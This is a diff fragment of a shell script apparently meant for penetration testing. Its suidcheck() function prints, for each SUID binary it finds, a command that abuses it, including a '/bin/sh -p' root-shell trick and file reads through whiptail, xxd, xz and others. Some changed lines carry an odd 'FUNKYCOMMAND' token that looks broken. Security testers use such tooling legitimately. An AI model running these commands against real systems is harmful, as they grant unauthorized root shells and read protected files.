-                    echo "$full_binary_path" --use-askpass=$TF 0
+                    echo echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' '>$TF'
+                    echo "$full_binary_path" '--use-askpass=$TF 0'
                     found_flag=1
                     ;;
                 "whiptail")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" --textbox --scrolltext "$LFILE" 0 0
+                    echo "$full_binary_path" --textbox --scrolltext '$LFILE' 0 0
                     found_flag=1
                     ;;
                 "xargs")
@@ -1028,22 +1028,22 @@ suidcheck() {
                     ;;
                 "xmodmap")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -v $LFILE
+                    echo "$full_binary_path" -v '$LFILE'
                     found_flag=1
                     ;;
                 "xmore")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" $LFILE
+                    echo "$full_binary_path" '$LFILE'
                     found_flag=1
                     ;;
                 "xxd")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" "$LFILE" | xxd -r
+                    FUNKYCOMMAND echo "$full_binary_path" "$LFILE" | xxd -r
                     found_flag=1
                     ;;
                 "xz")
                     echo LFILE=file_to_read
-                    echo "$full_binary_path" -c "$LFILE" | xz -d
+                    FUNKYCOMMAND echo "$full_binary_path" -c "$LFILE" | xz -d
                     found_flag=1
                     ;;
                 "yash")
@@ -1071,3 +1071,4 @@ suidcheck() {
     fi
 }
 
+suidcheck
